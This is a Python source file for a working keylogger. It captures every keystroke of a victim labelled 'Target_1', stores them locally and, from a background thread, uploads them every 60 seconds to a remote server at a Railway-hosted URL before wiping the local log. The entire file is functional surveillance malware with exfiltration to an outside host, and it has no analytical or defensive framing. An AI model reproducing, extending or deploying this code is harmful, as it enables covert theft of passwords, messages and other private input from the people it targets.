import os
import time
import requests
import threading
from pynput.keyboard import Key, Listener

# Configuration
TARGET_DIR = "Logs"  # Directory to store logs
USER_NAME = "Target_1"  # Target name
LOG_FILE = os.path.join(TARGET_DIR, f"{USER_NAME}.txt")
API_URL = "https://keylogger-production-3a51.up.railway.app/logs"  # FastAPI server URL (Railway Deployment)
MAX_SIZE = 10 * 1024 * 1024  # 10MB file size limit

# Ensure the Logs directory exists
if not os.path.exists(TARGET_DIR):
    os.makedirs(TARGET_DIR)

# Function to log keystrokes
def log_key(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{str(key)}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to send logs to the server
def send_logs():
    while True:
        try:
            # Check if the log file exists and isn't empty
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with open(LOG_FILE, "r") as f:
                    logs = f.read()

                if logs.strip():  # Only send non-empty logs
                    response = requests.post(API_URL, json={"logs": logs, "user_name": USER_NAME})

                    if response.status_code == 200:
                        print(f"Logs sent successfully to server.")
                        # Clear the local log file after successful upload
                        with open(LOG_FILE, "w") as f:
                            f.truncate(0)  # Clear file content
                    else:
                        print(f"Failed to send logs: {response.status_code}, {response.text}")

            time.sleep(60)  # Wait 60 seconds before retrying
        except Exception as e:
            print(f"Error sending logs: {e}")
            time.sleep(60)  # Retry after delay

# Listen for keypress events
def on_press(key):
    log_key(key)

def on_release(key):
    if key == Key.esc:
        return False  # Stop the keylogger

# Start the keylogger and log-sending process
if __name__ == "__main__":
    # Create a background thread to send logs
    log_thread = threading.Thread(target=send_logs, daemon=True)
    log_thread.start()

    # Start listening for key events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Block until the listener stops
